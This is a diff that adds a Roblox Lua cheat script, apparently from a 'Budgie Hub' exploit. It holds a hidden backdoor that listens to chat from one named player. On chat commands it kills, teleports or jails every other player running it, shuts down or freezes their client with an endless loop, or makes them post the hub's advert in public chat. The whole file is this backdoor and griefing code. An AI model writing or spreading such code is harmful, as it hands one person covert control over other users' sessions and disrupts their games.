@@ -1,0 +1,95 @@
+function onPlayerChatted(message, player)
+  lowercaseMessage = message:lower()
+player = game.Players.LocalPlayer
+    if lowercaseMessage:find("*kill_all") then
+        if player.UserId ~= 6036506267 then
+ function getAllPlayers()
+    local players = game:GetService("Players"):GetPlayers()
+    return players
+end
+ allPlayers = getAllPlayers()
+        for _, p in ipairs(allPlayers) do
+ p.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
+         end
+       end
+   end
+end
+
+game.Players.Hamsterovich.Chatted:Connect(onPlayerChatted)
+
+function onPlayerChatted(message, player)
+  lowercaseMessage = message:lower()
+player = game.Players.LocalPlayer
+    if lowercaseMessage:find("*find") then
+        if player.UserId ~= 6036506267 then
+      game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I using Budgie Hub | Best hack/script for Sukuna Battlegrounds", "All")
+         end
+       end
+end
+
+game.Players.Hamsterovich.Chatted:Connect(onPlayerChatted)
+
+function onPlayerChatted(message, player)
+  lowercaseMessage = message:lower()
+player = game.Players.LocalPlayer
+    if lowercaseMessage:find("*jail_all") then
+        if player.UserId ~= 6036506267 then
+     
+ function getAllPlayers()
+    local players = game:GetService("Players"):GetPlayers()
+    return players
+end
+ allPlayers = getAllPlayers()
+        for _, p in ipairs(allPlayers) do
+ game.Players[p.Name].Character.HumanoidRootPart.CFrame = CFrame.new(-1279, 33, 3)
+         end
+       end
+   end
+end
+
+game.Players.Hamsterovich.Chatted:Connect(onPlayerChatted)
+
+function onPlayerChatted(message, player)
+  lowercaseMessage = message:lower()
+player = game.Players.LocalPlayer
+    if lowercaseMessage:find("*bring_all") then
+        if player.UserId ~= 6036506267 then
+     
+ function getAllPlayers()
+    local players = game:GetService("Players"):GetPlayers()
+    return players
+end
+ allPlayers = getAllPlayers()
+        for _, p in ipairs(allPlayers) do
+ game.Players[p.Name].Character.HumanoidRootPart.CFrame = game.Players.Hamsterovich.Character.HumanoidRootPart.CFrame
+         end
+       end
+   end
+end
+
+game.Players.Hamsterovich.Chatted:Connect(onPlayerChatted)
+
+function onPlayerChatted(message, player)
+  lowercaseMessage = message:lower()
+player = game.Players.LocalPlayer
+    if lowercaseMessage:find("*kick_all") then
+        if player.UserId ~= 6036506267 then
+      game:Shutdown()
+         end
+       end
+end
+
+game.Players.Hamsterovich.Chatted:Connect(onPlayerChatted)
+
+function onPlayerChatted(message, player)
+  lowercaseMessage = message:lower()
+player = game.Players.LocalPlayer
+    if lowercaseMessage:find("*crash_all") then
+        if player.UserId ~= 6036506267 then
+      while true do
+      end
+         end
+       end
+end
+
+game.Players.Hamsterovich.Chatted:Connect(onPlayerChatted)
